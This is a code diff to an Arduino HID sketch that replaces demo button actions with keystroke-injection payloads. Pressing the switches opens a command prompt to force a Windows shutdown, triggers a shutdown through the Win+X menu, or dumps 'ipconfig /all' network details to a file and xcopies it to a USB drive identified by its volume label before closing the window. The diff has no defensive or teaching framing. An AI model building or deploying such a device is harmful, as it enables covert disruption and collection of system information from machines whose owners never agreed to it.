@@ -24,6 +24,7 @@ void loop() {
    // Keyboard.write("A");  
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
+   
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("cmd");
@@ -50,22 +51,138 @@ void loop() {
 
   if (digitalRead(pinB) == LOW)                     //Checking if the second switch has been pressed
   {
-    Keyboard.print("You pressed switch B");         //Sending a string
-    delay(500);
+   Keyboard.press(KEY_LEFT_GUI);
+   Keyboard.press('r');
+   Keyboard.releaseAll();
+   delay(100);
+   Keyboard.print("cmd");
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
+   delay(100);
+   Keyboard.print("shutdown/s");
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
   }
 
   if (digitalRead(pinC) == LOW)                     //Checking if the third switch has been pressed
   {
-    Keyboard.println("You have pressed switch C."); //Sending a string and a return
-    delay(500);
+
+   Keyboard.press(KEY_LEFT_GUI);
+   Keyboard.press('x');
+   delay(30);
+   Keyboard.releaseAll();
+  
+   
+   Keyboard.press('u');
+   Keyboard.releaseAll();
+   
+   Keyboard.press('u');
+   Keyboard.releaseAll();
+   delay(3000);
+    
   }
 
-  if (digitalRead(pinD) == LOW)                     //Checking if the fourth switch has been pressed
+  if (digitalRead(pinD) == LOW)                    
   {
-    Mouse.press(MOUSE_RIGHT);                       //Pressing down the right click
-    delay(100);
-    Mouse.release(MOUSE_RIGHT);                     //Releasing the right click
-    delay(500);
+
+   Keyboard.press(KEY_LEFT_GUI);
+   Keyboard.press('r');
+   Keyboard.releaseAll();
+   delay(100);
+   Keyboard.print("cmd");
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
+   delay(300);
+   
+   Keyboard.print("cd/"); 
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
+   delay(300);
+
+   Keyboard.print("mkdir TEST");
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
+   delay(300);
+
+   Keyboard.print("cd C:\\TEST");
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
+   delay(300);
+
+   Keyboard.print("ipconfig /all > text.txt");
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
+   delay(300);
+   
+
+   
+   
+ 
+   Keyboard.print("wmic logicaldisk where volumename='DANOOJ' get name");
+   Keyboard.press(KEY_RETURN);
+   Keyboard.releaseAll();
+   delay(300);
+
+
+    
+   Keyboard.press(KEY_LEFT_SHIFT);
+   Keyboard.press(KEY_LEFT_CTRL);
+   Keyboard.press(KEY_LEFT_ARROW); 
+   Keyboard.releaseAll();
+   delay(200);
+   Keyboard.press(KEY_LEFT_SHIFT);
+   Keyboard.press(KEY_LEFT_CTRL);
+   Keyboard.press(KEY_LEFT_ARROW); 
+   Keyboard.releaseAll();
+   delay(200);
+
+
+   
+   Keyboard.press(KEY_LEFT_CTRL);
+   Keyboard.press('c');
+   Keyboard.releaseAll();
+   delay(200);
+
+
+   Keyboard.print("xcopy /h /i /c /k /e /r /y C:\\TEST  ");
+   Keyboard.press(KEY_LEFT_CTRL);
+   Keyboard.press('v');
+   Keyboard.releaseAll();
+   delay(300);
+
+
+
+   Keyboard.press(KEY_LEFT_ALT);
+   Keyboard.press(KEY_F4);
+   Keyboard.releaseAll();
+  
+
+
+  
+   
+
+
+
+
+
+
+   delay(10000);
+
+
+  }
+
+
+
+  if (digitalRead(pinE) == LOW)                    
+  {
+
+
+   
+   
+   
+   
+   
+
   }
 
  
